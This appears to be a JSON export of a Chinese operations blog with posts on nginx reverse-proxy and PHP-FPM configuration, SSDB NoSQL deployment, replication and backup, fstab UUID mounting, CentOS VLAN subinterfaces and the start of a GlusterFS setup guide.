#定义虚拟目录(前端机可以不存在此目录) location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;game_garywu; #启用负载均衡，用上面定义的“game_garywu” proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; #当其中一台返回错误码error&#x2F;500等错误时，可以分配到下一台服务器程序继续处理，提高访问成功率 set $proxy_host &quot;game.garywu&quot;; # 定义$proxy_host的值为后端定义的servername &quot;game.garywu&quot; proxy_set_header Host $proxy_host; #替换用户请求数据包头部的Host信息为$proxy_host值信息 proxy_set_header X-Forwarded-For $remote_addr; #设置显示访问客户端的真实源IP地址 &#125; location &#x3D; &#x2F;favicon.ico &#123; #定义favicon.ico文件 access_log off; #不记录ico访问日志 log_not_found off; #不记录ico访问日志 &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;game.garywu.com.access_log main; #定义访问日志 error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;game.garywu.com.error_log warn; #定义错误日志&#125; 【后端机】vim game.garywu.com.conf 以第一台后端机为例，其他后端机需修改listen IP 12345678910111213141516171819202122232425server &#123; listen 192.168.50.140:80; #后端机IP地址 server_name game.garywu; #与前端机定义的头部host信息保持一致 root &#x2F;usr&#x2F;share&#x2F;html&#x2F;game.garywu.com; #定义虚拟目录(必须存在且有源码等) location ~ ^(.*)\\&#x2F;\\.svn\\&#x2F; &#123; #漏洞预防-过滤.*和.svn deny all; &#125; location &#x3D; &#x2F;favicon.ico &#123; #定义ico access_log off; log_not_found off; &#125; location ~ \\.php$ &#123; include fastcgi_params; fastcgi_param SCRIPT_FILENAME &#x2F;PHP文件路径$fastcgi_script_name; #PHP文件路径 #fastcgi_pass 127.0.0.1:9000; #PHP-FPM地址和端口号 fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php5-fpm.sock; #可以使用php-fpm的socket #fastcgi_pass php-garywu; #也可以指定upstream字段名称（如下） &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;game.garywu.com.access_log main; #定义访问日志 error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;game.garywu.com.error_log warn; #定义错误日志&#125; 配置中将.php结尾的请求通过FashCGI交给PHP-FPM处理，PHP-FPM是PHP的一个FastCGI管理器。 [PHP-FPM]在conf.d目录下创建文件：vim php-garywu.conf 1234567upstream php-garywu &#123; server unix:&#x2F;var&#x2F;run&#x2F;php5-fpm.sock weight&#x3D;100 max_fails&#x3D;10 fail_timeout&#x3D;30;&#125;upstream php7-garywu &#123;server unix:&#x2F;var&#x2F;run&#x2F;php7-fpm.sock weight&#x3D;100 max_fails&#x3D;10 fail_timeout&#x3D;30;&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"php","slug":"php","permalink":"https://garywu520.github.io/tags/php/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"php-fpm","slug":"php-fpm","permalink":"https://garywu520.github.io/tags/php-fpm/"},{"name":"FastCGI","slug":"FastCGI","permalink":"https://garywu520.github.io/tags/FastCGI/"}]},{"title":"SSDB-NoSQL数据库部署","slug":"SSDB-NoSQL数据库部署","date":"2017-09-26T04:11:30.000Z","updated":"2017-09-26T09:33:16.645Z","comments":true,"path":"2017/09/26/SSDB-NoSQL数据库部署/","link":"","permalink":"https://garywu520.github.io/2017/09/26/SSDB-NoSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E7%BD%B2/","excerpt":"概述 12345SSDB 是一个 C++ 开发的 NoSQL 数据库, 支持Key-value&#x2F;Key-hashmap&#x2F;zset(sorted set)等数据结构，十分适合存储数亿条级别的列表、排序表等集合数据，是redis的替代与增强方案。SSDB使用Google公司开源的LevelDB引擎作为底层的存储引擎。SSDB 采用 New BSD License 许可协议, 一个非常宽松灵活的协议，支持主从复制, 负载均衡。SSDB地址：http:&#x2F;&#x2F;ssdb.io&#x2F;zh_cn&#x2F;","text":"概述 12345SSDB 是一个 C++ 开发的 NoSQL 数据库, 支持Key-value&#x2F;Key-hashmap&#x2F;zset(sorted set)等数据结构，十分适合存储数亿条级别的列表、排序表等集合数据，是redis的替代与增强方案。SSDB使用Google公司开源的LevelDB引擎作为底层的存储引擎。SSDB 采用 New BSD License 许可协议, 一个非常宽松灵活的协议，支持主从复制, 负载均衡。SSDB地址：http:&#x2F;&#x2F;ssdb.io&#x2F;zh_cn&#x2F; SSDB特性 替代 Redis 数据库, Redis 的 100 倍容量 LevelDB 网络支持, 使用 C/C++ 开发 Redis API 兼容, 支持 Redis 客户端 适合存储集合数据, 如 list, hash, zset… 客户端 API 支持的语言包括: C++, PHP, Python, Java, Go 持久化的队列服务 主从复制, 负载均衡 SSDB与redis区别 1redis数据是全部存储在了内存中，而SSDB绝对优势是将数据写入了硬盘，同时也支持配置部分内存用于缓存热数据。 SSDB数据类型 1234567KV(Key-value)数据类型KV 数据类型主要用于存储离散的、之间没有关系或者关系被忽略 的大数据, 如图片文件, 大段文本等. 一般 KV 类型都可以被 Hashmap 替代, 但KV会比Hashmap性能高一些.Hashmap 如果数据需要经常被遍历, 则应该使用 Hashmap 来替代 KV。对于只添加, 不更新和删除的有排序需求的数据集合, 可以用 Hashmap 来存储而不需要使用 Zset, 因为 Hashmap 会比Zset 性能高一些.Zset 是一种根据数据项的权重(score, 整数值)进行排序的集合, Zset 集合中的数据项是唯一,不可重复的. Zset 可以理解为关系数据中只有 ID 主键和整数 score 字段⼀一共两个字段的表.因为 Zset 的排序特性, 所以可用来存储排序列表, 如商品按价格的排序列表, 商品按上架日期的排序列表等等. 每一个排序列表对应一个 Zset 集合.Zset 不能用来存储大体积的数据, 因为它是一种&quot;索引&quot;数据类型, 被索引的东西(集合中的数据项)只能是 200 字节以内的字节数组(包括字符串). 部署 编译安装 123456yum groupinstall &quot;Development tools&quot; -ywget --no-check-certificate https:&#x2F;&#x2F;github.com&#x2F;ideawu&#x2F;ssdb&#x2F;archive&#x2F;master.zipunzip mastercd ssdb-mastermakemake install PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;ssdb 故障解决： 1234567891011121314151617181920212223如果出现如下错误:g++ ...deps&#x2F;snappy-1.1.0&#x2F;.libs&#x2F;libsnappy.a: No such file or directorymake[1]: *** [all] Error 1或者g++ ...deps&#x2F;jemalloc-3.3.1&#x2F;lib&#x2F;libjemalloc.a: No such file or directorymake[1]: *** [all] Error 1这是因为 Snappy 或者 Jemalloc 没有编译成功, 这一般是因为你的系统时钟有问题。解决方案:cd deps&#x2F;snappy-1.1.0autoreconf --force --install.&#x2F;configuremake或者cd deps&#x2F;jemalloc-3.3.1autoreconf --force --install.&#x2F;configuremake 启动和停止1234567891011# 启动主库, 此命令会阻塞住命令行.&#x2F;ssdb-server ssdb.conf# 或者启动为后台进程(不阻塞命令行).&#x2F;ssdb-server -d ssdb.conf# 停止 ssdb-server.&#x2F;ssdb-server ssdb.conf -s stop# 重启.&#x2F;ssdb-server ssdb.conf -s restart SSDB启动脚本（随操作系统自启动）123假设你已经安装 SSDB 在默认的 &#x2F;usr&#x2F;local&#x2F;ssdb 目录, 把 tools&#x2F;ssdb.sh 脚本放到 &#x2F;etc&#x2F;init.d 目录下.注意: 对于 CentOS 用户, 请将 ssdb.sh 重命名为 ssdb. 1234将 &#x2F;data&#x2F;ssdb_data&#x2F;test&#x2F;ssdb.conf 修改为你的 SSDB 配置文件的路径. 如果你有多个 SSDB 实例, 那么把它们写在一行, 用空格来分隔, 例如:# each config file for one instanceconfigs&#x3D;&#x2F;usr&#x2F;local&#x2F;ssdb&#x2F;ssdb.conf &#x2F;usr&#x2F;local&#x2F;ssdb1&#x2F;ssdb.conf 12chkconfig --add ssdbchkconfig ssdb on 检查ssdb版本123[root@gserver1 ssdb]# &#x2F;usr&#x2F;local&#x2F;ssdb&#x2F;ssdb-server -vssdb-server 1.9.5Copyright (c) 2012-2015 ssdb.io 配置1注：SSDB 的配置文件使用一个 TAB 来表示一级缩进, 不要使用空格来缩进, 无论你用1个, 2个, 3个, 4个, 5个, 6个, 7个, 8个或者无数个空格都不行! 1重要：一定要记得修改你的 Linux 内核参数, 关于 max open files(最大文件描述符数)的内容, 请参考 [1]. 否则, 你会在 log.txt 看到 Too many open files 类似的错误, 或者在客户端看到 Connection reset by peer 错误. CentOS7解决“打开文件数max open files”配置12345678在ssdb.conf中最后加入如下代码leveldb: max_open_files: 50000配置完成需要重启系统参考：https:&#x2F;&#x2F;www.oldcai.com&#x2F;archives&#x2F;1123 测试系统打开文件数(工具:c1000k): https:&#x2F;&#x2F;github.com&#x2F;ideawu&#x2F;c1000k 监听网络端口1234567891011work_dir &#x3D; .&#x2F;varpidfile &#x3D; .&#x2F;var&#x2F;ssdb.pidserver: ip: 127.0.0.1 #本地回环网络。无法从其它机器上连接此 SSDB 服务器 port: 32121注：如果你希望从其它机器上连接 SSDB 服务器, 必须把 127.0.0.1 改为 0.0.0.0. 同时, 利用配置文件的 deny, allow 指令限制可信的来源 IP 访问.警告：如果不做网络限制便监听 0.0.0.0 IP 可能导致被任意机器访问到你的数据, 这很可能是一个安全问题! 你可以结合操作系统的 iptables 来限制网络访问. 只读模式12server: readonly: yes|no SSDB 可以工作在只读模式下, 在只读模式下, 所有的写操作命令都会被服务端拒绝: 12345ssdb 127.0.0.1:8888&gt; set a 2client_error: Forbidden Command: set(0.000 sec)默认配置文件不设置此选项, 那表示可读可写. 日志配置与分析1234567891011121314151617logger: level: debug #支持的日志级别有: debug, info, warn, error, fatal output: log.txt #可直接写相对路径或者绝对路径, 如果相对路径, 则是相对配置文件所在的目录. rotate: size: 1000000000 #设置日志拆分时的大小, 单位为字节数,默认100M大小进行切分注：logger.rorate.size 日志循环和清理; (1)日志切分后的文件名格式如：log.txt.20150723-230422, 切分后的日志文件不会自动被清理, 你需要自己写 crontab 脚本来清理.如果你想输出日志到终端屏幕, 编辑 ssdb.conf, 将logger: output: log.txt修改为logger: output: stdout 日志解读1一般, 建议你将 logger.level 设置为 debug 级别. 请求处理 12014-06-18 11:01:40.335 [DEBUG] serv.cpp(395): w:0.393,p:5.356, req: set a 1, resp: ok 1 w:0.393 请求的排队时间, 毫秒 p:5.356 请求的处理时间, 毫秒 req:... 请求内容 resp:... 响应内容 找出慢请求 , 命令是: 1234tail -f log.txt | grep resp | grep &#39;[wp]:[1-9][0-9]\\&#123;0,\\&#125;\\.&#39;# 或者cat log.txt | grep resp | grep &#39;[wp]:[1-9][0-9]\\&#123;0,\\&#125;\\.&#39; 这些命令用于找出排队时间, 或者处理时间大于等于 1 毫秒的请求. 找出大于 10 毫秒的请求: 1cat log.txt | grep resp | grep &#39;[wp]:[1-9][0-9]\\&#123;1,\\&#125;\\.&#39; 找出大于 100 毫秒的请求: 1cat log.txt | grep resp | grep &#39;[wp]:[1-9][0-9]\\&#123;2,\\&#125;\\.&#39; SSDB 在工作中 ssdb-server 会每隔 5 分钟输出这样的一条 log 1232014-06-18 11:18:03.600 [INFO ] ssdb-server.cpp(215): ssdb working, links: 02014-06-18 11:23:03.631 [INFO ] ssdb-server.cpp(215): ssdb working, links: 0 links: 0 当前的连接数 LevelDB 配置1234567891011leveldb.cache_size 内存缓存大小, 单位 MB一般地, 这个数字越大, 性能越好, 你可设置为物理内存的一半. 如果你的机器内存较小, 那就把它改小, 最小值是 16.leveldb.write_buffer_size 写缓冲区大小, 单位 MB如果你的机器内存小, 那就把它改小, 否则改大. 它应该在这个范围内: [4, 128];leveldb.compaction_speed一般情况下, 不用关心. 如果你的硬盘性能非常差, 同时, 你的数据几乎不变动, 也没有什么新数据写入, 可以把它改小(最好大于 50).leveldb.compression 压缩硬盘上的数据最好设置为 yes! 如果是 yes, 一般你能存储 10 倍硬盘空间的数据, 而且性能会更好. 内存占用123456789101112一个 ssdb-server 实例占用的内存瞬时(有可能, 而且即使达到, 也只是持续短时间)最高达到(MB):cache_size + write_buffer_size * 66 + 32这是对于压缩选项没有开启的情况. 如果 compression: yes, 计算公式是:cache_size + 10 * write_buffer_size * 66 + 32你可以调整配置参数, 限制 ssdb-server 的内存占用.对于一般负载的实例来说, 物理内存的持续占用是:cache_size + write_buffer_size * 4 + 32根据实际经验, 使用默认配置的实例, 会占用约 1GB 的内存. 这个经验你可以参考. 设置内存上限 1234567很抱歉, SSDB 无法设置内存占用上限. SSDB占用的内存大小, 和下列因素相关:cache_size 参数配置, 这是最主要的因素.客户端连接的数量, 一般来说, 每一个连接要占用 2MB 的内存, 但也和连接的使用繁忙度请求响应的大小等有关.文件缓存, 虽然是被 ssdb-server 进程占用, 但是可被操作系统回收的, 可能会占用数十 GB.SSDB 的繁忙程度, 服务越繁忙, SSDB 会倾向于使用更多的内存, 以提高响应速度.总体来说, cache_size 参数是你可以控制的, 后面的因素你无法控制. 例如, 在一个比较空闲的 SSDB 上, 如果物理内存是 16G, 而你设置 cache_size 是 8000(8G), 那么你通过 top 命令会看到 ssdb-server 进程占用 RES 内存可能在 12G 左右. 如果是一个比较繁忙的实例, RES 可能达到 15G. 命令行工具ssdb-cli使用123连接到SSDB服务器&#x2F;usr&#x2F;local&#x2F;ssdb&#x2F;ssdb-cli -h 127.0.0.1 -p 8888 本地连接&#x2F;usr&#x2F;local&#x2F;ssdb&#x2F;ssdb-cli -h 192.168.56.101 -p 32121 远程连接 输入 ‘h’, 然后按回车查看帮助信息. 下面是操作的演示: 12345678910111213ssdb 127.0.0.1:8888&gt; set k 1ok(0.000 sec)ssdb 127.0.0.1:8888&gt; get k1(0.000 sec)ssdb 127.0.0.1:8888&gt; del kok(0.000 sec)ssdb 127.0.0.1:8888&gt; get kerror: not_found(0.000 sec)ssdb 127.0.0.1:8888&gt; SSDB命令列表参考：立即转到-SSDB命令 同步和复制的配置与监控 一主多从 server1 【IP:192.168.56.101】 1234567891011121314server: ip: 0.0.0.0 port: 32121 deny: all allow: 192.168replication: binlog: yes sync_speed: -1 slaveof: id: svc_1 type: mirror host: 192.168.56.101 port: 32121 server2 12345678replication: binlog: yes sync_speed: -1 slaveof: id: svc_2 type: sync host: 192.168.56.101 port: 32121 server3 12345678replication: binlog: yes sync_speed: -1 slaveof: id: svc_3 type: sync host: 192.168.56.101 port: 32121 多主多从 server1【IP:192.168.56.101】 1234567891011121314server: ip: 0.0.0.0 port: 32121 deny: all allow: 192.168replication: binlog: yes sync_speed: -1 slaveof: id: svc_1 type: mirror host: 192.168.56.101 port: 32121 server2 1234567891011121314server: ip: 0.0.0.0 port: 32121 deny: all allow: 192.168replication: binlog: yes sync_speed: -1 slaveof: id: svc_2 type: mirror host: 192.168.56.101 port: 32121 server3 12345678replication: binlog: yes sync_speed: -1 slaveof: id: svc_3 type: sync host: 192.168.56.101 port: 32121 单台服务器包含n个实例 在一组一共包含 n 个实例的 SSDB 实例群中, 每一个实例必须 slaveof 其余的 n-1 个实例. 1234567891011121314151617181920replication: slaveof: id: svc_1 # sync|mirror, default is sync type: mirror # use ip for older version #ip: 127.0.0.1 # use host since 1.9.2 host: localhost port: 8888 slaveof: id: svc_2 # sync|mirror, default is sync type: mirror # use ip for older version #ip: 127.0.0.1 # use host since 1.9.2 host: localhost port: 8889 # ... more slaveof 监控同步状态12345678910111213141516171819202122232425262728293031323334353637[root@gserver1 ssdb]# .&#x2F;ssdb-cli -h 192.168.56.101 -p 32121ssdb 192.168.56.101:32121&gt; infoversion 1.9.5links 1total_calls 3dbsize 398binlogs capacity : 20000000 #capacity: binlog 队列的最大长度 min_seq : 1 #min_seq: 当前队列中的最小 binlog 序号 max_seq : 14 #max_seq: 当前队列中的最大 binlog 序号replication client 192.168.56.103:33194 #slaveof|client host:port, 远端 master&#x2F;slave 的 host:port. type : sync #type: 类型, sync|mirror. status : SYNC #status: 当前同步状态, DISCONNECTED|INIT|OUT_OF_SYNC|COPY|SYNC. last_seq : 14 #last_seq: 上一条发送或者收到的 binlog 的序号.replication client 192.168.56.102:52412 type : mirror status : SYNC last_seq : 14replication client 192.168.56.101:59664 type : mirror status : SYNC last_seq : 14replication slaveof 192.168.56.101:32121 id : svc_1 type : mirror status : SYNC last_seq : 14 copy_count : 4 sync_count : 0 关于status状态 12345DISCONNECTED: 与 master 断开了连接, 一般是网络中断或者是配置文件限制了访问.INIT: 初始化状态.OUT_OF_SYNC: 由于短时间内在 master 有大量写操作, 导致 binlog 队列淘汰, slave 丢失同步点, 只好重新复制全部的数据.COPY: 正在复制基准数据的过程中, 新的写操作可能无法及时地同步.SYNC: 同步状态是健康的. 判断同步状态–是否正常 12345对于 master, binlogs.max_seq 是指当前实例上的最新一次的写(写&#x2F;更新&#x2F;删除)操作的序号, replication.client.last_seq 是指已发送给 slave 的最新一条 binlog 的序号.所以, 如果你想判断主从同步是否已经同步到位(实时更新), 那么就判断 binlogs.max_seq 和 replication.client.last_seq 是否相等, 同时 status 是 SYNC.上面的例子中，比对max_seq : 14 与last_seq : 14 数值即可。 info cmd 123456789101112131415161718ssdb 192.168.56.101:32121&gt; info cmdversion 1.9.5cmd.zincr calls: 0 time_wait: 0 time_proc: 0cmd.cluster_set_kv_status calls: 0 time_wait: 0 time_proc: 0cmd.sync140 calls: 0 time_wait: 0 time_proc: 0cmd.ttl calls: 0 time_wait: 0 time_proc: 0cmd.qfix calls: 0 time_wait: 0 time_proc: 0cmd.qtrim_frontcalls: 该命令总共处理了多少次.time_wait: 命令在被处理前等待的总共时间(单位毫秒).time_proc: 命令处理总共消耗的时间(单位毫秒). 对数据库进行强制收缩 1234ssdb 192.168.56.101:32121&gt; compactok(0.010 sec)这个命令强制 SSDB 服务器对数据进行收缩(compaction), 收缩之后, 操作通常会变得更快.但是, compact 的过程可能会拖慢正常服务, 特别是是当数据库比较大时. 所以, 建议在空闲时使用. SSDB备份(导入导出) 使用ssdb-cli 导出 12345678导出整个数据库cd &#x2F;usr&#x2F;local&#x2F;ssdb.&#x2F;ssdb-cli -h 192.168.56.101 -p 32121ssdb 192.168.56.101:32121&gt; export backup.ssdb100%done.默认导出路径在&#x2F;usr&#x2F;local&#x2F;ssdb目录下 12345678910111213141516171819按照key区间导出数据库（导出&#x2F;导入）ssdb 192.168.56.101:32121&gt; export -i 2017.9.26_backup.ssdbinput KV range[start, end]: start(inclusive, default none): a end(inclusive, default none): zinput HASH range: start(inclusive, default none): end(inclusive, default none): input ZSET range: start(inclusive, default none): end(inclusive, default none): input QUEUE range: start(inclusive, default none): end(inclusive, default none): 100%done.注：命令 export -i backup.ssdb将导出区间 [a, z] 内的 KV 和 所有的 HASH, ZSET, QUEUE. 导入 12345678910ssdb 192.168.56.101:32121&gt; import backup.ssdb或ssdb 192.168.56.101:32121&gt; import 2017.9.26_backup.ssdb33%64%79%100%done.注意： import 命令会把数据库中的相同 key 给替换. 使用ssdb-dump命令 备份导出 12345678910111213141516171819202122232425262728293031323334353637用法：&#x2F;usr&#x2F;local&#x2F;ssdb&#x2F;ssdb-dump ip port output_folder选项：ip - ssdb 服务器监听的 IP 地址port - ssdb 服务器监听的端口号output_folder - 将要创建备份数据的本地目录注：目录 output_folder 必须不存在, 因为 ssdb-dump 会创建这个目录. 导出之后, 这个目录里将有两个子目录, data 目录里包含着数据, 还有一个空的 meta 目录.##############################################################################################[root@gserver1 ssdb]# .&#x2F;ssdb-dump 192.168.56.101 32121 .&#x2F;bakssdb-dump - SSDB backup commandCopyright (c) 2012-2015 ssdb.iorecv begin...received 1 entry(s)received 4 entry(s)recv endtotal dumped 4 entry(s) CompactionsLevel Files Size(MB) Time(sec) Read(MB) Write(MB)--------------------------------------------------compacting data... CompactionsLevel Files Size(MB) Time(sec) Read(MB) Write(MB)-------------------------------------------------- 2 1 0 0 0 0backup has been made to folder: .&#x2F;bak[root@gserver1 ssdb]# cd bak&#x2F;[root@gserver1 bak]# ls -lhtotal 0drwxr-xr-x 2 root root 103 Sep 26 05:04 datadrwxr-xr-x 2 root root 6 Sep 26 05:04 meta 恢复 1将 output_folder 目录拷贝到你的服务器上面, 你可能需要将它改名. 然后修改你的 ssdb.conf 配置文件, 将 work_dir 指向output_folder 目录, 然后重启 ssdb-server. 从redis迁移数据到SSDB123456789101112SSDB源码包中，Tools目录下的“ redis-import.php ” PHP 脚本可以用来将 Redis 服务器上的数据, 拷贝到 SSDB 服务器上.用法：php redis-import.php redis_host redis_port redis_db ssdb_host ssdb_port参数:redis_host: Redis 运行所在的 IP 或者主机名redis_port: Redis 监听的端口redis_db: Redis 的 DB 编号ssdb_host: SSDB 运行所在的 IP 或者主机名ssdb_port: SSDB 监听的端口注：需确保你的 PHP Redis 模块 https:&#x2F;&#x2F;github.com&#x2F;nicolasff&#x2F;phpredis 已经安装. 将现有的LevelDB数据导入SSDB1234567891011121314SSDB 提供了 leveldb-import 工具来将 LevelDB 的数据导入到 SSDB 数据库中. 该工具的使用非常简单用法:.&#x2F;tools&#x2F;leveldb-import ip port input_folder选项:ip - SSDB服务器的 IPport - SSDB服务器的端口号input_folder - 本地LevelDB数据库的目录示例:.&#x2F;tools&#x2F;leveldb-import 127.0.0.1 8888 .&#x2F;leveldb&#x2F;注：你不能直接复制 LevelDB 的文件到 SSDB 目录, 这种方式是错误的.","categories":[],"tags":[{"name":"NoSQL","slug":"NoSQL","permalink":"https://garywu520.github.io/tags/NoSQL/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"主从复制","slug":"主从复制","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"ssdb","slug":"ssdb","permalink":"https://garywu520.github.io/tags/ssdb/"},{"name":"LevelDB","slug":"LevelDB","permalink":"https://garywu520.github.io/tags/LevelDB/"}]},{"title":"fstab磁盘自动挂载问题","slug":"fstab磁盘自动挂载问题","date":"2017-09-24T05:51:41.000Z","updated":"2017-09-24T05:58:31.192Z","comments":true,"path":"2017/09/24/fstab磁盘自动挂载问题/","link":"","permalink":"https://garywu520.github.io/2017/09/24/fstab%E7%A3%81%E7%9B%98%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD%E9%97%AE%E9%A2%98/","excerpt":"磁盘开机挂载问题 vim /etc/fstab文件修改","text":"磁盘开机挂载问题 vim /etc/fstab文件修改 123使用设备名称（&#x2F;dev&#x2F;sda)来挂载分区时是被固定死的，一旦磁盘的插槽顺序发生了变化，就会出现名称不对应的问题,因为这个名称是会改变的。这个时候系统重启可能会导致致命错误。推荐使用UUID的方式，因为每个分区被格式化以后都会有一个UUID作为唯一的标识号,使用uuid挂载的话就不用担心会发生错乱的问题了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"磁盘挂载","slug":"磁盘挂载","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/"},{"name":"fstab","slug":"fstab","permalink":"https://garywu520.github.io/tags/fstab/"},{"name":"开机挂载","slug":"开机挂载","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%9C%BA%E6%8C%82%E8%BD%BD/"}]},{"title":"CentOS7-创建网卡子接口","slug":"CentOS7-创建网卡子接口","date":"2017-09-24T04:31:32.000Z","updated":"2017-09-24T04:41:15.286Z","comments":true,"path":"2017/09/24/CentOS7-创建网卡子接口/","link":"","permalink":"https://garywu520.github.io/2017/09/24/CentOS7-%E5%88%9B%E5%BB%BA%E7%BD%91%E5%8D%A1%E5%AD%90%E6%8E%A5%E5%8F%A3/","excerpt":"为网卡创建子接口可以应用很多实际工作场景，满足工作需求","text":"为网卡创建子接口可以应用很多实际工作场景，满足工作需求 配置流程 检测OS是否已经加载802.1q模块 12345678910111213[root@linux-node1 network-scripts]# modinfo 8021qfilename: &#x2F;lib&#x2F;modules&#x2F;3.10.0-514.el7.x86_64&#x2F;kernel&#x2F;net&#x2F;8021q&#x2F;8021q.koversion: 1.8license: GPLalias: rtnl-link-vlanrhelversion: 7.3srcversion: 7E3D79395FFBC56AFC109DEdepends: mrp,garpintree: Yvermagic: 3.10.0-514.el7.x86_64 SMP mod_unload modversions signer: CentOS Linux kernel signing keysig_key: D4:88:63:A7:C1:6F:CC:27:41:23:E6:29:8F:74:F0:57:AF:19:FC:54sig_hashalgo: sha256 出现filename: /lib/modules/3.10.0-514.el7.x86_64/kernel/net/8021q/8021q.ko说明已经加载 &amp;. 如何加载802.1q模块 12345678#加载802.1q模块modprobe 8021q#检查[root@linux-node1 network-scripts]# lsmod |grep 8021q8021q 33104 0 garp 14384 1 8021qmrp 18542 1 8021q 复制父接口并修改接口名称 1cp &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0 &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0.0 配置ifcfg-eth0.0 1234567DEVICE&#x3D;ethX.192BOOTPROTO&#x3D;noneONBOOT&#x3D;yesIPADDR&#x3D;192.168.1.10 ##改为与父接口相同的网段的IPPREFIX&#x3D;24NETWORK&#x3D;192.168.1.0#VLAN&#x3D;yes ##开启vlan，表明此子接口为vlan接口 重启网络 123systemctl restart networkifconfig |grep eth0:0ping测试 工作场景：如何监控高可用VIP接口流量？ 123思路：1. VIP配置可以绑定子接口；2. 在Linux中对网卡配置多个子接口，然后VIP调用对应子接口，然后使用zabbix监控子接口","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"网卡","slug":"网卡","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E5%8D%A1/"},{"name":"子接口","slug":"子接口","permalink":"https://garywu520.github.io/tags/%E5%AD%90%E6%8E%A5%E5%8F%A3/"},{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"}]},{"title":"GlusterFS存储","slug":"GlusterFS分布式存储","date":"2017-09-24T02:50:18.000Z","updated":"2017-09-26T03:56:56.368Z","comments":true,"path":"2017/09/24/GlusterFS分布式存储/","link":"","permalink":"https://garywu520.github.io/2017/09/24/GlusterFS%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8/","excerpt":"概述 1GlusterFS (Gluster File System) 是一个开源的分布式文件系统，主要由 Z RESEARCH 公司负责开发。GlusterFS 是 Scale-Out 存储解决方案 Gluster 的核心，具有强大的横向扩展能力，通过扩展能够支持数PB存储容量和处理数千客户端。GlusterFS 借助 TCP&#x2F;IP 或 InfiniBand RDMA 网络将物理分布的存储资源聚集在一起，使用单一全局命名空间来管理数据。GlusterFS 基于可堆叠的用户空间设计，可为各种不同的数据负载提供优异的性能。","text":"概述 1GlusterFS (Gluster File System) 是一个开源的分布式文件系统，主要由 Z RESEARCH 公司负责开发。GlusterFS 是 Scale-Out 存储解决方案 Gluster 的核心，具有强大的横向扩展能力，通过扩展能够支持数PB存储容量和处理数千客户端。GlusterFS 借助 TCP&#x2F;IP 或 InfiniBand RDMA 网络将物理分布的存储资源聚集在一起，使用单一全局命名空间来管理数据。GlusterFS 基于可堆叠的用户空间设计，可为各种不同的数据负载提供优异的性能。 12345GlusterFS 总体架构与组成部分如图1所示，它主要由存储服务器（Brick Server）、客户端以及 NFS&#x2F;Samba 存储网关组成。不难发现，GlusterFS 架构中没有元数据服务器组件，这是其最大的设计这点，对于提升整个系统的性能、可靠性和稳定性都有着决定性的意义。(1) GlusterFS 支持 TCP&#x2F;IP 和 InfiniBand RDMA 高速网络互联。(2) 客户端可通过原生 GlusterFS 协议访问数据，其他没有运行 GlusterFS 客户端的终端可通过 NFS&#x2F;CIFS 标准协议通过存储网关访问数据（存储网关提供弹性卷管理和访问代理功能）。(3) 存储服务器主要提供基本的数据存储功能，客户端弥补了没有元数据服务器的问题，承担了更多的功能，包括数据卷管理、I&#x2F;O 调度、文件定位、数据缓存等功能，利用 FUSE（File system in User Space）模块将 GlusterFS 挂载到本地文件系统之上，实现 POSIX 兼容的方式来访问系统数据。 GlusterFS总体架构 GlusterFS卷类型 12为了满足不同应用对高性能、高可用的需求，GlusterFS 支持 7 种卷，即 distribute 卷、stripe 卷、replica 卷、distribute stripe 卷、distribute replica 卷、stripe Replica 卷、distribute stripe replica 卷。其实不难看出，GlusterFS 卷类型实际上可以分为 3 种基本卷和 4 种复合卷，每种类型的卷都有其自身的特点和适用场景。 GlusterFS常见术语 123456名称 解释Brick 最基本的存储单元，表示为trusted storage pool中输出的目录，供客户端挂载用。Volume 一个卷。在逻辑上由N个bricks组成。FUSE Unix-like OS上的可动态加载的模块，允许用户不用修改内核即可创建自己的文件系统。Glusterd Gluster management daemon，要在trusted storage pool中所有的服务器上运行。POSIX 一个标准，GlusterFS兼容。 部署 环境 1234567891011121314服务器：192.168.56.10 角色：gluster_client192.168.56.101 角色：gluster_server1 192.168.56.102 角色：gluster_server2192.168.56.103 角色：gluster_server3gluster是去中心化存储，所以拓扑结构类似网状注：每台服务器单独一块10G磁盘来模拟生产环境的大容量RIAD磁盘或盘柜等。提前格式化并挂载好,(下面的卷就创建在&#x2F;data&#x2F;A目录上)如下：192.168.56.10 挂载目录： &#x2F;data&#x2F;A192.168.56.101 挂载目录: &#x2F;data&#x2F;A 192.168.56.102 挂载目录: &#x2F;data&#x2F;A 192.168.56.103 挂载目录: &#x2F;data&#x2F;A 安装/验证/启动【全节点配置】 12345678910111213GlusterFS项目被Redhat收购，官方提供repo可以直接安装。安装yum install centos-release-gluster -yyum install glusterfs-server 